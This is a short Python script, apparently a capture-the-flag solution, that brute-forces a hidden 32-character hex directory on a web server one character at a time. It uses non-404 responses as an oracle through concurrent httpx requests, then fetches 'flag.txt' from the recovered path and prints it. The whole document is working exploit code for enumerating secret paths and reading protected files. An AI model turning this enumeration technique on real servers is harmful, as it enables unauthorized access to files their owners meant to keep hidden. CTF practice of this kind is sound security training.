import httpx, asyncio

HEX = "0123456789abcdef"


def encode_to_path(ar):
    path = ""
    for c in ar:
        path += f"/%{ord(c):02x}"
    return path


async def main():
    async with httpx.AsyncClient(base_url="<URL>") as client:
        pre = []
        while len(pre) < 32:
            tasks = []
            for h in HEX:
                cur = pre + [h]
                tasks.append(client.get(encode_to_path(cur)))
            responses = await asyncio.gather(*tasks)
            for h, resp in zip(HEX, responses):
                if resp.status_code != 404:
                    pre.append(h)
                    print(pre)
                    break
        pre += [*"flag.txt"]
        resp = await client.get(encode_to_path(pre))
        print(resp.text)


asyncio.run(main())
